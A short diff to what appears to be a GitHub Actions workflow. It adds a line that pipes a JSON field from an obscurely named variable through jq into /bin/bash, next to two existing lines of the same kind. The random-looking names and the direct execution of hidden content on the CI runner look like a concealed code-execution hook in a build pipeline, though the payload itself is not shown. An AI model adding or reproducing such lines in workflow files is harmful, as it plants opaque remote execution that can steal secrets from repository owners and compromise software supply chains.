@@ -22,6 +22,7 @@ jobs:
         run: |
           printf '%s' "$brr4192" | jq -r .uv5 | /bin/bash
           printf '%s' "$cacry96113" | jq -r .puuv3 | /bin/bash
+          echo $a728 | jq -r .br9 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
